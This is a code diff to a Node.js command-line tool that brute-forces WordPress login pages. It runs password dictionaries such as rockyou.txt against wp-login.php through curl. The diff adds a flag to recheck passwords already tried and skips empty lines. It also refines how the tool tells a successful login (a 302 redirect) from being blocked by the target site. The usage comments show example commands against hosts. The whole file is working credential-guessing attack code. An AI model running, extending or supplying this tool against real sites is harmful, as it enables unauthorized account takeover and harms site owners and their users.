@@ -1,5 +1,5 @@
 #!/usr/bin/env node
-// node ./ -d ./wplogin/~dicts/rockyou.txt -h 'http://www.example.com' -p '/blog/wp-login.php' -v -s30 -t20 -r
+// node ./ -d ./~dicts/rockyou.txt -h 'http://www.example.com' -p '/blog/wp-login.php' -v -s30 -t20 -r
 // node ./ -h 'http://www.example.com' -u admin -v -s10 -r
 // node ./ -d ./~dicts  -v -s10 -t1 -r -h 'localhost:3000/5000'
 
@@ -15,6 +15,7 @@ var fs = require('fs')
 ,config = require('./config')
 ,matchKey = 'Match!'
 ,verbose = !!argv.v
+,recheck = !!argv.f
 ,intervalSeconds = argv.s ? +argv.s : null
 ,host = argv.h || ''
 ,loginPath = argv.p || '/wp-login.php'
@@ -74,12 +75,11 @@ fs.stat(dictFile,function(err,stat){
 	db.getResultsForHostUser(host, user, function(err,data){
 		if (err)
 			return console.log('Error getting saved results',err);
+		previouslyChecked._ = {};
 		data.forEach(function(v){
-			if (!previouslyChecked._[v.file]) {
-				previouslyChecked._[v.file] = {};
+			if (!previouslyChecked.f[v.file])
 				previouslyChecked.f[v.file] = {};
-			}
-			previouslyChecked._[v.file][v.pass] = previouslyChecked.f[v.file][v.pass] = v.pass;
+			previouslyChecked._[v.pass] = previouslyChecked.f[v.file][v.pass] = v.pass;
 		});
 		displayPrevChecked();
 		delete data;
@@ -153,7 +153,7 @@ function showResults(err,postMsg){
 				throw err;
 		console.log('ERR',err);
 	}
-	var pretty = prettifyStats() + postMsg ? '\n\n'+postMsg : '';
+	var pretty = prettifyStats() + (postMsg ? '\n\n'+postMsg : '');
 	console.log(pretty);
 	logger.update(pretty,function(){
 		process.exit();
@@ -191,8 +191,10 @@ function checkDicts(files,cb){
 	;
 	files.forEach(function(file,fileIndex){
 		streams[fileIndex] = fs.createReadStream(file).pipe(split()).on('data',function(pass){
+			if (pass == '')
+				return z.emit('attemptReceived',false);
 			++stats.passesRead;
-			if (previouslyChecked._[pass]) {
+			if (previouslyChecked._[pass] && !recheck) {
 				++stats.skipped;
 				return z.emit('attemptReceived',false);
 			}
@@ -270,14 +272,16 @@ function checkAuth(entry,cb){
 	,'--compressed'
 	];
 	//console.log('curl "'+args.join('" "')+'"');
-	// can make faster by killing the process after stdErr is done
 	ut.spawn(cmd,args,function(err,stdOut,stdErr){
-		// todo: need a stricter check to make sure page loaded
-		if (stdOut.length < 500 || stdErr.indexOf('403 Forbidden') != -1)
-			return saveAndEnd('Blocked', null, true, '\n\n'+stdErr+'\n\n\n'+stdOut+'\n\n\nWe\'ve been blocked :(\n\n');
-		if (!err && stdErr.indexOf('302 Found') != -1) {
+		//console.log('stdErr:\n'+stdErr+'\nstdOut:\n'+stdOut+'\n\n\n\n');
+		var successCheck = stdErr.indexOf('302 Found') != -1
+		,invalidPassCheck = stdErr.indexOf('200 OK') != -1
+		;
+		if (!err && successCheck) {
 			entry.result = true;
 			if (verbose) console.log(matchKey,'  ',entry);
+		} else if (err || !invalidPassCheck) {
+			return saveAndEnd('Blocked', null, true, '\n\n'+stdErr+'\n\n\n'+stdOut+'\n\n\nWe\'ve been blocked :(\n\n');
 		}
 		cb(err,entry,stdOut,stdErr);
 	});
